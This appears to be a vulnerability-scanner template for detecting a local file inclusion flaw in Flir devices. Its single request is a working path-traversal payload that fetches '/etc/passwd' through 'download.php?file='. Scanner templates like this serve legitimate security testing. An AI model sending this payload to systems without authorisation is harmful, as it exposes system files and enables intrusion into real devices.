id: flir-path-traversal
brief:
    title: Flir - Local File Inclusion
    by: pikpikcu
    level: high
    about: Flir is vulnerable to local file inclusion.
    label:
        - flir
        - lfi
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/download.php?file=/etc/passwd'
      signs:
        - "on": status
          status:
            - 200
